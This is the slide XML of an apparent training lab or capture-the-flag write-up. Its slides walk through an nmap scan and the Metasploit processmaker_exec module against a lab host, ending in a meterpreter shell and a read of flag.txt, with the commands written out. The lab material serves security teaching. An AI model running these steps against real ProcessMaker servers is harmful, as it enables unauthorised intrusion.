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79" r:id="rId5"/>
    <p:sldId id="278" r:id="rId6"/>
    <p:sldId id="260" r:id="rId7"/>
    <p:sldId id="280" r:id="rId8"/>
    <p:sldId id="286" r:id="rId9"/>
    <p:sldId id="282" r:id="rId10"/>
    <p:sldId id="287" r:id="rId11"/>
    <p:sldId id="285" r:id="rId12"/>
    <p:sldId id="281" r:id="rId13"/>
    <p:sldId id="288" r:id="rId14"/>
    <p:sldId id="263" r:id="rId15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824" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="85" d="100"/>
          <a:sy n="85" d="100"/>
        </p:scale>
        <p:origin x="1590" y="96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6AFA9A-7D3E-42CC-927E-F23DCCD6D484}" type="datetime2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2020年12月30日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1311F18-D970-4D7B-B098-1E7546817641}" type="datetime2">
              <a:rPr lang="zh-TW" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>2020年12月30日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2674CE4-FBD8-4481-AEFB-CA53E599A74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US" altLang="zh-TW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indent="0" rtl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587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9995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511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In the command text field, we typed the command “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> -v 10.4.27.251” for scanning target machine.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observed that the machine may be vulnerable to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>ProcessMaker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> Open Source Authenticated PHP Code Execution.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pPr rtl="0"/>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p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9441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launched a new command line terminal, typed </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> and pressed Enter. This launched </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p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8693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typed “search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>processmaker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>” to search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t> modules for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>processmaker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialM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b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>We would use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>processmaker_exec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t> remote buffer overflow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t> module to exploit the target.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6220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typed use “use exploit/multi/http/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>processmaker_exec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launch </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> module.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192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typed “set RHOSTS 10.4.27.251”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>to set up targe IP.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79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algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>Next, We typed “run” to exploit the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1200" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>target vulnerable application (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1200" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>processmaker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1200" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>. Then, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>we had successfully exploited the target vulnerable application (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>processmaker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>) and received a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t> shell.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261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typed ”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>sysinfo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>” to get system information.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2516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Finally, we get </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>the flag</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>a3dcb4d229de6fde0db5686dee47145d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159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800B302-F4DC-4547-9C74-CF794137D166}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-TW" smtClean="0"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865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矩形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17" name="頁尾預留位置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8" name="日期預留位置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D680CC22-4E9F-4C64-95EA-15180CEA148A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29" name="投影片編號預留位置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44B7CC-4AA8-43B8-AE83-02691DCDABC3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kumimoji="0"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572BCF-2FF2-4C6E-B5A8-E6DE1AF4B961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F4FBF5-CDC6-4057-A311-5C521C8F5DB8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5" name="內容預留位置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28" name="頁尾預留位置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6" name="日期預留位置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3E8C17-4C3B-4AED-BB36-C741E1DC4CDE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27" name="投影片編號預留位置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/>
          <a:p>
            <a:pPr rtl="0"/>
            <a:fld id="{A274F4D4-41C4-43DF-B10D-F70E9B50FCC2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0D8C69-8E88-4B86-8CF3-2D8ABB71F89F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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>編輯母片標題樣式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5A7139-9615-44C0-8E48-7B3A81ED52C4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eaVert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zh-TW" altLang="en-US"/>
              <a:t>按一下圖示以新增圖片</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0"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70A3B-5055-4ACA-8D9E-69847E896869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FB655-E279-4DE7-AFF4-4A3FE36E3A57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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>按一下以編輯母片文字樣式</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第二層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第三層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第四層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第五層</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>a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7E4AE4-EFA9-4FD9-A229-004A31E547D5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矩形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5" name="矩形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7" name="矩形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8" name="矩形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0" name="矩形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標題預留位置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13" name="文字預留位置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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>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dirty="0"/>
              <a:t>新增頁尾</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="日期預留位置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2233221-9E5A-44E3-8D2A-51D4D9EBD76D}" type="datetime2">
              <a:rPr lang="zh-TW" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>2020年12月30日</a:t>
            </a:fld>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="投影片編號預留位置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01CF334-2D5C-4859-84A6-CA7E6E43FAEB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>
          <p15:clr>
            <a:srgbClr val="F26B43"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="1" pos="3840">
          <p15:clr>
            <a:srgbClr val="F26B43"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2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curityfocus.com/bid/6341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ugs.processmaker.com/view.php?id=134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en-US" altLang="zh-TW" b="1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ProcessMaker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Open Source Authenticated PHP Code Execution</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" altLang="en-US" b="1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zh-TW" sz="3600" dirty="0" err="1"/>
              <a:t>Seris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  <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>Exploit</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>Reference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706268"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="2249488"/>
          <a:ext cx="10972800" cy="190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 System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WIN-OMCNBKR66MN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1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IP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10.4.27.251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1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Domain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None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90475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Port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TCP: 80, 135, 139, 445, 3306, 3389, 49152, 49153, 49154, 49155, 49163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4208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Windows NT WIN-OMCNBKR66MN 6.2 build 9200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821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8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1472295"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="2249488"/>
          <a:ext cx="109728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Application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ProcessMaker-2_5_0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336848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Application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Info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ProcessMaker</a:t>
                      </a:r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automates workflows that are form-based and approval-driven and it improves the way that information flows between people and systems.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24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15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559671"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="2249488"/>
          <a:ext cx="10972800" cy="367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Vulnerability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ProcessMaker</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t> Open Source Authenticated PHP Code Execution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336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Versions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Open Source 2.x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1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Platforms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PHP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90475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Exploitation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Remote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4208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module exploits a PHP code execution vulnerability in the ‘neoclassic’ skin for </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="en-US" altLang="zh-TW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ProcessMaker</a:t>
                      </a:r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Open Source which allows any authenticated user to execute PHP code. The vulnerable skin is installed by default in version 2.x and cannot be removed via the web interface.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731310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Impact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authenticated attacker can exploit these issues to execute arbitrary PHP code within the context of the web server.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82123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Solution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93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89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Nmap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2457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nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> -v 10.4.27.251</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>  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6883930-8203-4344-8F73-98870D1D2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511" y="1924720"/>
            <a:ext cx="6169511" cy="464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1241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msfconsole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6693EAB-AE0E-45D9-92D0-67871652A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915" y="1629879"/>
            <a:ext cx="6755047" cy="492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214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search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>processmaker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5194E74-D524-47FC-A833-36130DCF7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729" y="1946433"/>
            <a:ext cx="6733604" cy="488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2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4239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use exploit/multi/http/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>processmaker_exec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>show options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9304FE7-E5F4-4275-9220-90D6B94DF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626" y="2092007"/>
            <a:ext cx="5922307" cy="463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2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242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 RHOSTS 10.4.27.251</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>show options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79FDFA6-66EC-436B-AE02-9324D8EF9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636" y="2619333"/>
            <a:ext cx="7460835" cy="224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run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EED3DB9-7A9B-493B-BB20-18C37821C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696" y="2896873"/>
            <a:ext cx="8072837" cy="360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5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82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sysinfo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151ABE5-B6D1-4A01-9567-E91B65518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315" y="1562338"/>
            <a:ext cx="6028312" cy="489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2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1305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shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>cd /</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>dir</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>type flag.txt</a:t>
            </a:r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E0E5B196-C970-450D-800A-B00060BB1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784" y="1614794"/>
            <a:ext cx="6490304" cy="519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9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hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://www.securityfocus.com/bid/63411</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>http://bugs.processmaker.com/view.php?id=13436</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rt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60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訓練課程簡報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4615_TF03460604.potx" id="{459C345E-EC57-4CE6-8378-CD5A0E02B40D}" vid="{75388508-C140-4AE9-B3F8-1A15F21DF63F}"/>
    </a:ext>
  </a:extLst>
</a:theme>
</file>

<file path=ppt/theme/theme2.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Office 佈景主題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440</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>寬螢幕</PresentationFormat>
  <Paragraphs>96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ArialMT</vt:lpstr>
      <vt:lpstr>Microsoft JhengHei UI</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Georgia</vt:lpstr>
      <vt:lpstr>Helvetica</vt:lpstr>
      <vt:lpstr>Wingdings 2</vt:lpstr>
      <vt:lpstr>訓練課程簡報</vt:lpstr>
      <vt:lpstr>ProcessMaker Open Source Authenticated PHP Code Execution</vt:lpstr>
      <vt:lpstr>Abstract</vt:lpstr>
      <vt:lpstr>Info</vt:lpstr>
      <vt:lpstr>Info</vt:lpstr>
      <vt:lpstr>Info</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit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漏洞資訊-SolarWinds Orion Platform部分版本存在後門程式，允許攻擊者遠端執行任意程式碼，請儘速確認並進行版本更新</dc:title>
  <dc:creator>zihling chen</dc:creator>
  <cp:lastModifiedBy>zihling chen</cp:lastModifiedBy>
  <cp:revision>142</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-12-29T03:57:03Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2020-12-29T18:15:00Z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